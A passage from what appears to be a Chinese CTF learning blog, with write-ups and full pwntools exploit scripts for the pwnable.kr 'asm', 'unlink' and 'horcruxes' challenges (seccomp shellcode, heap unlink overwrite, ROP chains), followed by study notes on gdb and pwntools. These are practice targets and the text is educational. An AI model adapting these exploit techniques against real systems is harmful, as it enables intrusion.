&lt;sys/mman.h&gt;#include &lt;seccomp.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#define LENGTH 128void sandbox()&#123; scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL); if (ctx == NULL) &#123; printf("seccomp error\n"); exit(0); &#125; seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0); if (seccomp_load(ctx) &lt; 0)&#123; seccomp_release(ctx); printf("seccomp error\n"); exit(0); &#125; seccomp_release(ctx);&#125;char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";unsigned char filter[256];int main(int argc, char* argv[])&#123; setvbuf(stdout, 0, _IONBF, 0); setvbuf(stdin, 0, _IOLBF, 0); printf("Welcome to shellcoding practice challenge.\n"); printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n"); printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n"); printf("If this does not challenge you. you should play 'asg' challenge :)\n"); char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0); memset(sh, 0x90, 0x1000); memcpy(sh, stub, strlen(stub)); int offset = sizeof(stub); printf("give me your x64 shellcode: "); read(0, sh+offset, 1000); alarm(10); chroot("/home/asm_pwn"); // you are in chroot jail. so you can't use symlink in /tmp sandbox(); ((void (*)(void))sh)(); return 0;&#125; 正如开头所说，第一部分为了帮我们搭一个框架，所以各方面都稍微涉及到，这题的目的是让我们对shellcode有一定的了解，分析代码，发现需要学的东西有沙箱中的seccomp() 参考1 参考2 然后他限制我们只能用open read write exit等 所以基本思路就是用read读flag中的内容，然后用write向标准输出写。然后写exp时需要用shellcraft生成调用函数的汇编代码再用反汇编生成shellcode。学会了一些写exp的新知识。 exp： 1234567891011from pwn import * s=ssh(host='pwnable.kr',user='asm',password='guest',port=2222)p=s.connect_remote('0',9026)context(arch='amd64',os='linux') shellcode=shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_ file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooo oooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooo oooooo000000000000o0o0o0o0o0o0ong')shellcode+=shellcraft.open('rsp',0)shellcode+=shellcraft.read('rax','rsp',1000)shellcode+=shellcraft.write(1,'rsp',1000) p.sendline(asm(shellcode))p.interactive() unlink思路: 1. 有源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;typedef struct tagOBJ&#123; struct tagOBJ* fd; struct tagOBJ* bk; char buf[8];&#125;OBJ;void shell()&#123; system("/bin/sh");&#125;void unlink(OBJ* P)&#123; OBJ* BK; OBJ* FD; BK=P-&gt;bk; FD=P-&gt;fd; FD-&gt;bk=BK; BK-&gt;fd=FD;&#125;int main(int argc, char* argv[])&#123; malloc(1024); OBJ* A = (OBJ*)malloc(sizeof(OBJ)); OBJ* B = (OBJ*)malloc(sizeof(OBJ)); OBJ* C = (OBJ*)malloc(sizeof(OBJ)); // double linked list: A &lt;-&gt; B &lt;-&gt; C A-&gt;fd = B; B-&gt;bk = A; B-&gt;fd = C; C-&gt;bk = B; printf("here is stack address leak: %p\n", &amp;A); printf("here is heap address leak: %p\n", A); printf("now that you have leaks, get shell!\n"); // heap overflow! gets(A-&gt;buf); // exploit this unlink! unlink(B); return 0;&#125; 这一题算是最基础的模仿unlink的堆的题目，设计的很巧妙，简洁易懂这和初学者入手，先查阅资料得知unlink的基本原理(我看的范例是double free)，理解unlink()函数的意图是解题关键，即B-&gt;fd-&gt;bk=B-&gt;bk B-&gt;bk-&gt;fd=B-&gt;fd 等价为 (**B+4)= （B+4） （B+4）= B 改写B中fd和bk的值理论上可以向任何地址写入任何数据。 开始解题： exp： 注意：recv()接收数据以字符串的形式，例：‘0x456789’占8个字节。print一下即可知道接收了几个字节。 1234567891011121314from pwn import * s=ssh(host='pwnable.kr',user='unlink',password='guest',port=2222)p=s.process('./unlink')sh_addr=0x080484ebp.recvuntil('here is stack address leak: ')stack_addr=p.recv(10)stack_addr=int(stack_addr,16)p.recvuntil('here is heap address leak: ')heap_addr=p.recv(10)heap_addr=int(heap_addr,16)payload=p32(sh_addr) + 'A' * 12 + p32(heap_addr+12) +p32(stack_addr+16)p.send(payload)p.interactive() blukathorcruxes思路：1. 没有源码，只能远程下载（scp -P 2222 horcruxes@pwnable.kr:~/horcruxes Desktop）在放进ida里分析。 题目提示为rop则肯定是利用栈溢出来pwn，所以找gets()成为第一步，发现在ropme()函数里有gets()，所以思路基本确定为改写ropme()的ret，分别打印出ABCDEFG的值，然后算出sum，之后再跳到ropme()函数再执行一次拿到flag。(难点在于写exp…….) 大致步骤为：1.先用ida找到七个函数的地址，记录下来之后 2.看偏移确定payload (操蛋的是sum的范围不能超过int，必须用一个if else结构选择一下) exp1： 12345678910111213141516171819202122232425262728293031from pwn import * s=ssh(host='pwnable.kr',user='horcruxes',password='guest',port=2222)p=s.connect_remote('localhost',9032)horcruxes=[0x0809fe4b,0x0809fe6a,0x0809fe89,0x0809fea8,0x0809fec7,0x0809fee6,0x0809ff05] ropme_addr=0x0809fff9sum=0p.sendlineafter("Select Menu:",'0')p.recvuntil("How many EXP did you earned? : ")payload='a'*0x78for i in range(7): payload+=p32(horcruxes[i])payload+=p32(ropme_addr)p.sendline(payload) for i in range(7): p.recvuntil("EXP +") tmp=p.recvuntil(")",drop=True) log.info(tmp) sum+=int(tmp,10)log.info("raw sum: 0x%x" % sum)if sum&gt;pow(2,31): log.warn('try again') exit(0)elif sum&lt;-pow(2,31): log.warn('try again') exit(0)p.sendlineafter("Select Menu:",'0')p.sendlineafter("How many EXP did you earned? : ",unicode(sum))p.interactive() exp2: 1234567891011121314151617181920212223242526272829303132333435from pwn import *from ctypes import *s=ssh(port=2222,host='pwnable.kr',user='horcruxes',password='guest')HOST = "localhost"PORT = 9032r = s.remote(HOST, PORT)horcruxes = [0x0809FE4B, 0x0809FE6A, 0x0809FE89, 0x0809FEA8, 0x0809FEC7, 0x0809FEE6, 0x0809FF05]main_call_ropme = 0x0809fffc def main () : exp = 0 r.recvuntil("Menu:") r.sendline('1') r.recvuntil(" : ") payload = "A"*116 payload += "B"*4 # SFP for i in range (7) : payload += p32(horcruxes[i]) payload += p32(main_call_ropme) r.sendline(payload) for i in range (7) : r.recvuntil("+") tmp = r.recvuntil(")").replace(")","") log.info(tmp) exp += int(tmp) log.info("exp : " + str(c_int(exp).value)) r.recvuntil("Menu:") r.sendline("1") r.recvuntil(" : ") r.sendline(str(c_int(exp).value)) r.interactive() if __name__ == '__main__' : main() pwnable.kr第一部分到此结束，（以前有一题codemap好像挺不错的，有空可以找来看一下。）也算对这一个多月时间的交代吧，进度已经慢太多，也有不少细节问题没弄懂。。。下一部分计划是跟着ctf-wiki把栈溢出学完，然后去jarvis.oj把栈溢出的七道题做了，然后在跟着ctf-wiki体系学习。]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[小心得]]></title>
    <url>%2F2018%2F12%2F20%2F%E5%B0%8F%E5%BF%83%E5%BE%97%2F</url>
    <content type="text"><![CDATA[解决的题目：kr.unlink 收获与问题： unlink收货： 对chunk结构有了初步了解 （具体） 对指针有了更加具体的概念，-&gt;代表的意义更加清晰，我个人比较喜欢用一层一层来理解指针，地址一层一层指向。以B-&gt;fd-&gt;bk=B-&gt;bk B-&gt;bk-&gt;fd=B-&gt;fd 也就是 (**B+4)= （B+4） （B+4）= B 工具更熟练，gdb了解了info frame()，bt(查看函数栈框信息)，b *addr（在汇编码地址下断点） ，list funcname(查看函数代码)，file docuname(查看文件信息（主要看elf文件有没有加壳和32还是64位)（说到这我elf文件还没开始看QAQ ),s(进入函数),n(不进入函数) gdb调试 一个比较弱智的东西：怎么用gcc把代码在64位系统上编译为32位elf文件。(这是做所有题目的基础，我竟然现在才发觉OTZ) 例：gcc -m32 -o -g unlink unlink.c (需要先安32位的库，网上都有) call(先将地址压栈，后eip进入子函数),leave(mov esp,ebp pop ebp),ret(pop eip) 抄了一遍exp，大致有个印象(暂时没有花时间学，下周任务) asm收货： 读flag方法：有shell以后，cat flag或者从flag读到缓冲区在write到标准输出。（一般在有沙箱时使用） print disasm(“机器码”)。 shellcraft.sh(),shellcraft.pushstr(),shellcraft.write(),shellcraft.read()出来的都是汇编代码，需要再asm一下。 rop收货 栈溢出基本思路：找带有输入漏洞函数（scnaf,gets）的函数(不要觉得main函数特殊),然后再利用偏移控制程序执行流。一找输入漏洞，二确定利用哪一个函数ret，三rop 稍稍复杂的exp怎么写 其他收货： 写blog时git config –global user.name/user.email时总是报错说找不到.gitconfig文件，但是实际上文件就在那里，上网找了好久，好像是.gitconfig目录少了一个.git文件夹 然后我用管理员身份运行它就可以hexo d了 我也不清楚为啥 反正现在主题也选好了，起码可以开始正常写blog了。：）此外，对blog的config文件也更加熟悉。 用ida可以直接看到栈中缓冲区和变量的地址（F5大法），peda的功能更加熟悉(可以直接查看寄存器的值，栈的值，将要执行的指令等)，收货一个pattern.py脚本，可用来算溢出点，但自己看最好。 0xfffffff8(%ebp)=%ebp-0x8 exp基本框架以及pwntools基本用法： pwntools使用简介 pwntools开始使用 一步一步学pwntools 123456789101112131415161718192021from pwn import *//s=ssh(host=&apos;&apos;,user=&apos;&apos;,password=&apos;&apos;,port=)p=s.connect_remote(&apos;服务器名称&apos;,port)/p=s.process(argv=[],executable=&apos;./文件名&apos;)context(arch=&apos;amd64&apos;,os=&apos;linux&apos;,log_level=&apos;debug&apos;)//log_level=&apos;debug&apos;的作用是将recv的内容全都显示在屏幕上。//定义变量p.recv(接收字节数)p.recvuntil(&apos;源代码中字符串&apos;)p.recvline()p.recvall()p.recvrepeat()p.send(发送字节数)p.senduntil(&apos;源代码中字符串&apos;)p.sendline()//shellcode生成：//payload生成:payload=&apos;n&apos;*mpayload+=p32(整数)/p64(整数)p.sendline(payload)p.interactive() send()和sendline()的区别:(已解决。。因为源代码有一个gets()函数,末尾必须加一个换行符已以告知程序输入完毕，所以写exp时用sendline(payload),或者用send(payload + ‘\n’)).. （还没细看）关于一些保护措施(ASRL/PIE, NX/DEP, RELRO, Canary(栈保护))，参考链接 linux程序的常用保护机制 先看寻址方式，再看gdb中偏移量 当看到很多大写字母变量换成数字时，常为宏定义 scanf()函数限制了输入的形式，不能随意控制，其应该是整数溢出的漏洞题型。现阶段能掌握的只有gets()函数。。。。。。（p32打包好像只能用于字符串中的整数，scanf(%d)中的必须自己输入send(‘整数’)，不加’‘代表为字节数。。） recv()的接收数据为字符串，且一位为一个字符。 p.recv(“)”,drop=True) == p.recv(“)”).replace(“)”,””) log为显示在屏幕上 有info warn 等几种标号 log 我觉得可能是网站的问题，前段时间做uaf的时候就觉得很怪，他题目的答案和在我电脑上跑出来的不一样，uaf的vtable地址都不一样，unlink的ABC地址都不一样。 工具还是用的不熟，以及汇编代码看的还是没感觉。还是练得太少 怎么创建一个新文件，以前还会，现在怎么不会了，服了，查了一会没查到，]]></content>
      <tags>
        <tag>pwn基础</tag>
        <tag>小心得</tag>
      </tags>
  </entry>
</search>
